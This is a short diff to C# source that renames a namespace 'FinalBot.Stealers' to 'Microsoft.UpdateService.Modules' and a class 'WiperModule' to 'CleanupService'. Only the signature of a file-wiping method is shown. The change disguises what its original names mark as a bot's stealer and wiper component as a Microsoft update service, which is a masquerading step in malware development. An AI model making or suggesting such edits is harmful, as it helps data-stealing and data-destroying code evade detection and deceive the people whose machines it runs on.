@@ -2,9 +2,9 @@ using System;
 using System.IO;
 using System.Security.Cryptography;
 
-namespace FinalBot.Stealers
+namespace Microsoft.UpdateService.Modules
 {
-    public static class WiperModule
+    public static class CleanupService
     {
         public static void WipeFile(string filePath, int passes = 1)
         {
